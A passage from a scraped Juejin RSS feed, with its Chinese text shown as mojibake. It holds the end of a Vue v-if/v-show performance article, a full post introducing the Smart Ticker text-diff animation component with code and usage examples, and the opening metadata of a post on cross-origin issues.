<table><thead><tr><th><strong>æŒ‡æ ‡</strong></th><th><strong>v-if æ–¹æ¡ˆ (ä¼ ç»Ÿç›´è§‰)</strong></th><th><strong>v-show æ–¹æ¡ˆ (ä¼˜åŒ–å)</strong></th><th><strong>æå‡æ•ˆæœ</strong></th></tr></thead><tbody><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>120MB (éšæ“ä½œå¢é•¿)</td><td>45MB (åŸºæœ¬æ’å®š)</td><td><strong>é™ä½ 60%+</strong></td></tr><tr><td><strong>é¦–å±æ¸²æŸ“</strong></td><td>1.8s</td><td>2.1s</td><td>ç•¥æœ‰ç‰ºç‰²</td></tr><tr><td><strong>æ»‘åŠ¨å¸§ç‡</strong></td><td>42fps (æœ‰å¡é¡¿)</td><td>59fps (ä¸æ»‘)</td><td><strong>æ˜¾è‘—æµç•…</strong></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">4. å¦‚ä½•å†™å‡ºâ€œé«˜æ€§èƒ½â€ç»„ä»¶ï¼Ÿ</h3>
<p>æ ¸å¿ƒç­–ç•¥æ˜¯ï¼š<strong>ç”¨ <code>v-show</code> å®ˆä½â€œå‘ä½â€ç¨³å®šæ€§ï¼Œç”¨ <code>v-if</code> ä¸¥æ§â€œå†…å®¹â€åŠ è½½æ—¶æœºã€‚</strong></p>
<ol>
<li><strong>å¤–å±‚ç”¨ <code>v-show</code></strong>ï¼šç¡®ä¿ Slot å®¹å™¨åœ¨å°ç¨‹åºåº•å±‚çš„ WXML ç»“æ„ä¸­æ°¸è¿œç¨³å®šï¼Œä¸äº§ç”Ÿå¹½çµèŠ‚ç‚¹ã€‚</li>
<li><strong>å†…å±‚ç”¨ <code>v-if</code></strong>ï¼šå®ç°çœŸæ­£çš„å†…å®¹æ‡’åŠ è½½ã€‚åªæœ‰ç”¨æˆ·ç¬¬ä¸€æ¬¡ç‚¹å¼€æ—¶ï¼Œæ‰çœŸæ­£æŒ‚è½½æ˜‚è´µçš„å†…å®¹ï¼›ä¸€æ—¦æŒ‚è½½ä¸å†é”€æ¯ï¼Œåªåšæ˜¾ç¤ºåˆ‡æ¢ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-4">5. æ€»ç»“</h3>
<p>æŠ€æœ¯é€‰å‹æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œä½†åœ¨å°ç¨‹åºè¿™ä¸ªâ€œç‰¹æ®Šç¯å¢ƒâ€ä¸‹ï¼Œç†è§£åº•å±‚ç¼–è¯‘åŸç†ï¼Œæ¯”ç›²ç›®å¥—ç”¨ Vue å®˜æ–¹æœ€ä½³å®è·µæ›´é‡è¦ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Smart Ticker - æ”¯æŒä»»æ„å­—ç¬¦çš„é«˜æ€§èƒ½æ–‡æœ¬å·®å¼‚åŠ¨ç”»æ»šåŠ¨ç»„ä»¶]]></title>    <link>https://juejin.cn/post/7589092567545004041</link>    <guid>https://juejin.cn/post/7589092567545004041</guid>    <pubDate>2025-12-29T14:16:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567545004041" data-draft-id="7589093895327055881" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Smart Ticker - æ”¯æŒä»»æ„å­—ç¬¦çš„é«˜æ€§èƒ½æ–‡æœ¬å·®å¼‚åŠ¨ç”»æ»šåŠ¨ç»„ä»¶"/> <meta itemprop="keywords" content="JavaScript,React.js,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T14:16:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="hibear"/> <meta itemprop="url" content="https://juejin.cn/user/3931509308267661"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Smart Ticker - æ”¯æŒä»»æ„å­—ç¬¦çš„é«˜æ€§èƒ½æ–‡æœ¬å·®å¼‚åŠ¨ç”»æ»šåŠ¨ç»„ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3931509308267661/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    hibear
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:16:28.000Z" title="Mon Dec 29 2025 14:16:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ€è¿‘åœ¨åšä¸€ä¸ªAIé…ç½®çš„ç»„ä»¶ï¼Œçªç„¶æœ‰äº†è¿™ä¸ªåšåŠ¨ç”»çš„ç®€å•åˆå§‹æƒ³æ³•<br/>
ä¾‹å¦‚ï¼š å½“æˆ‘é€‰æ‹© GPT-5.2 mini å»æ›¿æ¢ GPT-5.1 æ—¶èƒ½ä¸èƒ½å‰ç¼€ GPT-5. ä¸åŠ¨å,é¢çš„ 2 mini æ›¿æ¢ 1 æ‰§è¡Œä¸€ä¸ªåŠ¨ç”»</p>
<p>æ£é¼“äº†ä¸€æ®µæ—¶é—´ï¼Œäºæ˜¯<strong>Smart Ticker</strong> è¯ç”Ÿäº†</p>
<blockquote>
<p><strong>å®˜ç½‘æœ‰å¾ˆå¤šåœºæ™¯æ¼”ç¤º Demo</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftombcato.github.io%2Fsmart-ticker%2F" target="_blank" title="https://tombcato.github.io/smart-ticker/" ref="nofollow noopener noreferrer">Smart Ticker Live Preview</a><br/>
<strong>GitHubä»“åº“ï¼Œè¯¦æƒ…è§README</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftombcato%2Fsmart-ticker" target="_blank" title="https://github.com/tombcato/smart-ticker" ref="nofollow noopener noreferrer">tombcato/smart-ticker</a></p>
</blockquote>
<p>Gifæœ‰ç‚¹æ‰å¸§ï¼Œè¯¦æƒ…è§<a href="https://link.juejin.cn?target=https%3A%2F%2Ftombcato.github.io%2Fsmart-ticker" target="_blank" title="https://tombcato.github.io/smart-ticker" ref="nofollow noopener noreferrer">å®˜ç½‘</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46cec0c978cf4b88aa6b5c4b238c2463~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGliZWFy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767638395&amp;x-signature=OZ0lyP%2BUFpH65IN5bUSWpNP7nIQ%3D" alt="smartticker3 (1).gif" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00e7ff68b1a144c9ad0144ffc8afaf25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGliZWFy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767638395&amp;x-signature=Pd5lHqCo3t9Hif9Q2%2BytiRB6%2Bg4%3D" alt="smartticker2.gif" loading="lazy"/>
æ¬¢è¿å» GitHub ç‚¹ä¸ª Star ğŸŒŸï¼Œæˆ–è€…åœ¨è¯„è®ºåŒºæ Issueï¼</p>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆåš Smart Tickerï¼Ÿ</h2>
<p>å¸‚é¢ä¸Šå…¶å®å·²ç»æœ‰ä¸å°‘æ•°å­—æ»šåŠ¨åº“äº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦é€ è¿™ä¸ªè½®å­ï¼Ÿæœ€å¤§çš„ç—›ç‚¹æ˜¯ï¼š<strong>å®ƒä»¬éƒ½ä¸æ”¯æŒä¸­æ–‡ã€Emoji æˆ–è€…æ··æ’æ›¿æ¢ã€‚</strong></p>






















































<table><thead><tr><th align="left">ç‰¹æ€§ / åº“</th><th align="left"><strong>Smart Ticker</strong> ğŸš€</th><th align="left"><strong>Odometer.js</strong></th><th align="left"><strong>React CountUp</strong></th><th align="left"><strong>Number Flow</strong></th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒæœºåˆ¶</strong></td><td align="left"><strong>Levenshtein Diff (æ™ºèƒ½æœ€çŸ­è·¯å¾„)</strong></td><td align="left">æ•°å€¼è½®æ’­ (0-9 å¾ªç¯)</td><td align="left">æ•°å€¼æ’å€¼ (æ•°å­—è·³åŠ¨)</td><td align="left">å¸ƒå±€è¿‡æ¸¡ (Layout transition)</td></tr><tr><td align="left"><strong>å­—ç¬¦æ”¯æŒ</strong></td><td align="left"><strong>å…¨å­—ç¬¦é›† (ä¸­è‹±æ–‡/Emoji/ç¬¦å·/æ•°å­—)</strong></td><td align="left">ä»…æ•°å­—</td><td align="left">ä»…æ•°å­—</td><td align="left">ä¸»è¦æ˜¯æ•°å­—</td></tr><tr><td align="left"><strong>åŠ¨ç”»æ•ˆæœ</strong></td><td align="left"><strong>ç²¾å‡†ç‚¹å¯¹ç‚¹ (åªåŠ¨å˜åŒ–çš„å­—ç¬¦)</strong></td><td align="left">æ»šè½®å¼ (å¿…é¡»æ»šè¿‡ä¸­é—´æ•°å­—)</td><td align="left">åªæœ‰æ•°å­—åœ¨å˜ï¼Œæ— ä½ç§»</td><td align="left">ç°ä»£ä¸”å¹³æ»‘</td></tr><tr><td align="left"><strong>ä¸­æ–‡/å…¨è§’é€‚é…</strong></td><td align="left"><strong>è‡ªåŠ¨å®½çª„å­—ç¬¦é€‚é…</strong></td><td align="left">å®¹æ˜“æŒ¤å‹æˆ–ä¹±ç </td><td align="left">N/A</td><td align="left">éœ€æ‰‹åŠ¨å¤„ç†</td></tr><tr><td align="left"><strong>å¤šæ¡†æ¶æ”¯æŒ</strong></td><td align="left"><strong>React + Vue 3 (åŒæ„æ ¸å¿ƒ)</strong></td><td align="left">JS Wrapper</td><td align="left">React</td><td align="left">å¤šæ¡†æ¶</td></tr><tr><td align="left"><strong>åŠ¨ç”»ä¸­æ–­</strong></td><td align="left"><strong>å¹³æ»‘æµä½“è¿‡æ¸¡</strong></td><td align="left">é‡ç½®æˆ–ç”Ÿç¡¬è·³è½¬</td><td align="left">å¹³æ»‘</td><td align="left">å¹³æ»‘</td></tr></tbody></table>
<p>æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼šå¤§å¤šæ•°åº“æ˜¯æŠŠå†…å®¹å½“æˆâ€œæ•°å­—â€å¤„ç†ï¼Œè€Œ <strong>Smart Ticker</strong> æ˜¯æŠŠå†…å®¹å½“æˆ <strong>â€œå­—ç¬¦ä¸²â€</strong> å¤„ç†ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ç”¨å®ƒæ¥æ»šåŠ¨çš„ä¸ä»…ä»…æ˜¯é‡‘é¢ï¼Œè¿˜å¯ä»¥æ˜¯ç”¨æˆ·åã€çŠ¶æ€æ–‡æœ¬ç­‰ç­‰ã€‚</p>
<h2 data-id="heading-2">æ ¸å¿ƒéš¾é¢˜ï¼šå¦‚ä½•è®©åŠ¨ç”»â€œèªæ˜â€èµ·æ¥ï¼Ÿ</h2>
<p>å¦‚æœä½ ç›´æ¥æŠŠ <code>1234</code> å˜æˆ <code>1254</code>ï¼Œæœ€ç¬¨çš„åŠæ³•æ˜¯æŠŠ <code>3</code> é”€æ¯ï¼Œåˆ›å»º <code>5</code>ã€‚ä½†æˆ‘ä»¬æƒ³è¦çš„æ˜¯ï¼šåªæœ‰ <code>3</code> å˜æˆ <code>5</code>ï¼Œå…¶ä»–æ•°å­—ä¿æŒé™æ­¢ã€‚</p>
<p>å¦‚æœå­—ç¬¦ä¸²é•¿åº¦ä¸ä¸€æ ·å‘¢ï¼Ÿæ¯”å¦‚ <code>Smart</code> å˜æˆ <code>Start</code>ã€‚</p>
<ul>
<li>ç¬¨åŠæ³•ï¼š5 ä¸ªå­—æ¯å…¨æ¢ã€‚</li>
<li><strong>èªæ˜åŠæ³•</strong>ï¼š<code>S</code>, <code>a</code>, <code>r</code>, <code>t</code> ä¸åŠ¨ï¼ŒæŠŠä¸­é—´çš„ <code>m</code> åˆ äº†ï¼Œæ’å…¥ä¸€ä¸ª <code>t</code>ï¼Ÿä¸å¯¹ï¼Œæ˜¯ <code>m</code> å˜æˆäº† <code>t</code>ã€‚</li>
</ul>
<p>è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª <strong>Diff é—®é¢˜</strong>ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»â€œæ—§å­—ç¬¦ä¸²â€åˆ°â€œæ–°å­—ç¬¦ä¸²â€çš„<strong>æœ€çŸ­ç¼–è¾‘è·¯å¾„</strong>ã€‚</p>
<h2 data-id="heading-3">ç®—æ³•å¼•å…¥ï¼šLevenshtein Distance</h2>
<p>è¿™é‡Œæˆ‘å¼•å…¥äº† <strong>Levenshtein Distanceï¼ˆç¼–è¾‘è·ç¦»ï¼‰</strong> ç®—æ³•çš„å˜ç§ã€‚é€šå¸¸æˆ‘ä»¬ç”¨å®ƒæ¥è®¡ç®—ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ä¼¼åº¦ï¼Œä½†åœ¨è¿™é‡Œï¼Œæˆ‘ç”¨å®ƒæ¥ç”Ÿæˆ<strong>æ“ä½œé˜Ÿåˆ—</strong>ã€‚</p>
<p>é€šè¿‡åŠ¨æ€è§„åˆ’çŸ©é˜µï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºæ¯ä¸€ä¸ªå­—ç¬¦åº”è¯¥æ‰§è¡Œä»€ä¹ˆåŠ¨ä½œï¼š</p>
<ol>
<li><strong>SAME (ä¸å˜)</strong>ï¼šä½ç½®ä¸å˜ï¼ŒUI ä¿æŒé™æ­¢ã€‚</li>
<li><strong>MODIFY (ä¿®æ”¹)</strong>ï¼šå­—ç¬¦å˜äº†ï¼ˆå¦‚ <code>3</code> -&gt; <code>5</code>ï¼‰ï¼Œæ‰§è¡Œæ»šåŠ¨åŠ¨ç”»ã€‚</li>
<li><strong>INSERT (æ’å…¥)</strong>ï¼šæ–°ä¸²å˜é•¿ï¼Œæ‰§è¡Œâ€œæŒ¤å…¥â€åŠ¨ç”»ã€‚</li>
<li><strong>DELETE (åˆ é™¤)</strong>ï¼šæ–°ä¸²å˜çŸ­ï¼Œæ‰§è¡Œâ€œæŒ¤å‡ºâ€åŠ¨ç”»ã€‚</li>
</ol>
<h3 data-id="heading-4">ä»£ç å®ç°</h3>
<p>åœ¨ <code>Core</code> æ¨¡å—ä¸­ï¼Œæˆ‘æ„å»ºäº†ä¸€ä¸ª <code>(N+1) x (M+1)</code> çš„çŸ©é˜µï¼Œå›æº¯è®¡ç®—æœ€ä¼˜è·¯å¾„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç®€åŒ–çš„å›æº¯é€»è¾‘</span>
<span class="hljs-keyword">while</span> (i &gt; <span class="hljs-number">0</span> || j &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; j &gt; <span class="hljs-number">0</span> &amp;&amp; oldStr[i-<span class="hljs-number">1</span>] === newStr[j-<span class="hljs-number">1</span>]) {
        <span class="hljs-comment">// å­—ç¬¦ç›¸ç­‰ -&gt; SAME</span>
        actions.<span class="hljs-title function_">unshift</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'SAME'</span>, <span class="hljs-attr">char</span>: oldStr[i-<span class="hljs-number">1</span>] });
        i--; j--;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (costMatrix[i][j] === costMatrix[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>) {
        <span class="hljs-comment">// æ›¿æ¢æ“ä½œ -&gt; MODIFY (Scroll)</span>
        actions.<span class="hljs-title function_">unshift</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'MODIFY'</span>, <span class="hljs-attr">from</span>: oldStr[i-<span class="hljs-number">1</span>], <span class="hljs-attr">to</span>: newStr[j-<span class="hljs-number">1</span>] });
        i--; j--;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* ... */</span>) {
        <span class="hljs-comment">// å¤„ç† INSERT / DELETE</span>
    }
}
</code></pre>
<p>æ­£æ˜¯å› ä¸ºæœ‰äº†è¿™ä¸ªç®—æ³•ï¼Œ<code>Smart Ticker</code> æ‰èƒ½åšåˆ°ï¼š</p>
<ul>
<li><strong>100 -&gt; 105</strong>ï¼šåªæœ‰ <code>5</code> åœ¨åŠ¨ã€‚</li>
<li><strong>Downloading... -&gt; Done</strong>ï¼šæ™ºèƒ½è¯†åˆ«å“ªäº›å­—æ¯ä¿ç•™ï¼Œå“ªäº›å­—æ¯æ»šèµ°ã€‚</li>
</ul>
<h2 data-id="heading-5">æŒ‘æˆ˜äºŒï¼šä¸ä»…æ˜¯æ•°å­—ï¼Œä¸­è‹±å­—æ¯Emojiæˆ‘å…¨éƒ½è¦ï¼</h2>
<p>æå®šäº†ç®—æ³•ï¼Œæ¸²æŸ“å±‚åˆæ˜¯ä¸€ä¸ªå‘ã€‚
ä¸­æ–‡å­—ç¬¦ï¼ˆå…¨è§’ï¼‰å’Œè‹±æ–‡å­—ç¬¦ï¼ˆåŠè§’ï¼‰å®½åº¦ä¸ä¸€æ ·ã€‚å¦‚æœå¼ºè¡Œç”¨ç­‰å®½å­—ä½“ï¼Œä¸­æ–‡ä¼šè¢«æŒ¤æˆä¸€å›¢æˆ–è€…è‹±æ–‡é—´è·è¿‡å¤§ã€‚</p>
<p>æˆ‘ä¹Ÿé‡åˆ°è¿‡è¿™ç§â€œç¾éš¾ç°åœºâ€ï¼Œä¸­æ–‡æŒ¤åœ¨ä¸€èµ·æ ¹æœ¬æ²¡æ³•çœ‹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong>
æˆ‘å®ç°äº†ä¸€ä¸ª <code>charWidth</code> åŠ¨æ€è®¡ç®—æœºåˆ¶ã€‚</p>
<ol>
<li><strong>æ£€æµ‹å­—ç¬¦ç±»å‹</strong>ï¼šé€šè¿‡ Unicode èŒƒå›´æ£€æµ‹å½“å‰å­—ç¬¦æ˜¯åŠè§’è¿˜æ˜¯å…¨è§’ï¼ˆæˆ–è€…æ˜¯ Emojiï¼‰ã€‚</li>
<li><strong>åŠ¨æ€åŸºå‡†å®½åº¦</strong>ï¼š
<ul>
<li>åŠè§’å­—ç¬¦ï¼ˆæ•°å­—/è‹±æ–‡ï¼‰ï¼šåŸºå‡†å®½ <code>0.8em</code>ï¼ˆç´§å‡‘ç¾è§‚ï¼‰ã€‚</li>
<li>å…¨è§’å­—ç¬¦ï¼ˆä¸­æ–‡ï¼‰ï¼šåŸºå‡†å®½ <code>1.25em</code>ï¼ˆé˜²æ­¢é‡å ï¼‰ã€‚</li>
<li>Emojiï¼šç‰¹æ®Šå¤„ç†ï¼Œç¡®ä¿ä¸è¢«æˆªæ–­ã€‚</li>
</ul>
</li>
</ol>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ— è®ºè¾“ <code>BTC $98,000</code> è¿˜æ˜¯ <code>å“ˆåŸºç±³ ğŸ±</code>ï¼Œæ’ç‰ˆéƒ½ç¨³å¦‚è€ç‹—ã€‚</p>
<h2 data-id="heading-6">æŒ‘æˆ˜ä¸‰ï¼šåŒæ¡†æ¶æ”¯æŒ (React + Vue)</h2>
<p>æœ‰äº›åº“åªæœ‰ React ç‰ˆï¼Œæˆ‘çš„AIé…ç½®ç»„ä»¶é¡¹ç›®æ˜¯åŸºäº Vueã€‚ä¸ºäº†é›¨éœ²å‡æ²¾ï¼Œæˆ‘é‡‡ç”¨ <strong>"Core + Adapter"</strong> çš„æ¶æ„è®¾è®¡ã€‚</p>
<ul>
<li><strong>src/core/</strong>: çº¯ TypeScript å®ç° Diff ç®—æ³•ã€å­—ç¬¦åˆ—è¡¨ç”Ÿæˆã€ç¼“åŠ¨å‡½æ•°ã€‚ä¸ä¾èµ–ä»»ä½•æ¡†æ¶ã€‚</li>
<li><strong>src/components/Ticker.tsx</strong>: React å°è£…å±‚ï¼Œä½¿ç”¨ <code>useRef</code> å’Œ <code>RAF</code> ç®¡ç†åŠ¨ç”»ã€‚</li>
<li><strong>src/components/vue/Ticker.vue</strong>: Vue 3 å°è£…å±‚ï¼Œä½¿ç”¨ <code>watch</code> å’Œ <code>requestAnimationFrame</code>ã€‚</li>
</ul>
<p>ç»“æœï¼šä¸¤å¥—ç»„ä»¶ API å®Œå…¨ä¸€è‡´ï¼Œç»´æŠ¤èµ·æ¥ä¹Ÿæå…¶è½»æ¾ã€‚</p>
<h2 data-id="heading-7">æœ€ç»ˆæ•ˆæœ &amp; å¦‚ä½•ä½¿ç”¨</h2>
<p>ç°åœ¨ï¼Œä½ åªéœ€è¦ä¸€è¡Œä»£ç å°±èƒ½ç”¨ä¸Šè¿™ä¸ªâ€œèªæ˜â€çš„ç»„ä»¶ï¼š</p>
<p><strong>å®‰è£…ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">npm install @tombcato/smart-ticker
</code></pre>
<p><strong>React ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Ticker</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tombcato/smart-ticker'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'@tombcato/smart-ticker/style.css'</span>;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Ticker</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"98,456.32"</span> /&gt;</span></span>
</code></pre>
<p><strong>Vue ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { Ticker } from '@tombcato/smart-ticker/vue';
import '@tombcato/smart-ticker/style.css';
&lt;/script&gt;

&lt;template&gt;
  &lt;Ticker value="ğŸš€ å‘å°„æˆåŠŸ" /&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-8">æ€»ç»“</h2>
<p>è¿™å°±æ˜¯ä¸€ä¸ªä»å°çµæ„Ÿåˆ°è½åœ°å®ç°çš„è¿‡ç¨‹ï¼ŒåšæŒèµ°ä¸‹å»ä»å®ç°å°çš„æƒ³æ³•åˆ°å®ç°å¤§çš„æƒ³æ³•ï¼Œå¦‚æœé˜¿ç¥–ä½ èƒ½çœ‹åˆ°è¿™é‡Œè¯·å¸®æˆ‘ç‚¹ä¸ªstarï¼Œæ„Ÿè°¢æ„Ÿè°¢ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è·¨åŸŸé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7589126814829674548</link>    <guid>https://juejin.cn/post/7589126814829674548</guid>    <pubDate>2025-12-29T14:36:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126814829674548" data-draft-id="7589126217234317318" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è·¨åŸŸé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-29T14:36:10.000Z"/> 